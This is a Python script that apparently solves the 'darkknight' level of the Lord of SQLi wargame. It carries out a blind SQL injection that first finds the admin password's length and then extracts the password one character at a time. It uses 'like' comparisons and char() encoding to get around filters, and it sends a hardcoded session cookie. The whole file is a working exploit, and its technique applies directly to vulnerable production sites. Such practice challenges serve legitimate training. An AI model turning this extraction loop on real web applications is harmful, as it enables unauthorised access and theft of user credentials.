import requests as req

flag = ""
length = 0

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?no="
session = dict(PHPSESSID = "e3cj1ei61p0q12g7kfekpc3vbr")

print ("[+] Start")
print ("[+] Find length")

for i in range (0, 100):
    try:
        query = url + "2000 || length(pw) like " + str(i) + ";%00"
        res = req.post(query, cookies = session)

    except:
        print ("[-] Error occured")
        continue

    if 'Hello admin' in res.text:
        length = i
        print ("[+] find length : ", length)
        break

print ("[+] Find password")

for i in range(1, length+1):
    for j in range(48, 128):
        try:
            query = url + "12345 || id like char(97,100,109,105,110) and mid(pw, " + str(i) + ", 1) like char(" + str(j) + ")"
            res = req.post(query, cookies = session)

        except:
            print ("[-] Error occured")
            continue

        if 'Hello admin' in res.text:
            flag += chr(j)
            print ("[+] Found : " + str(i) ," : ", flag)
            break

print("[+] flag : ", flag)
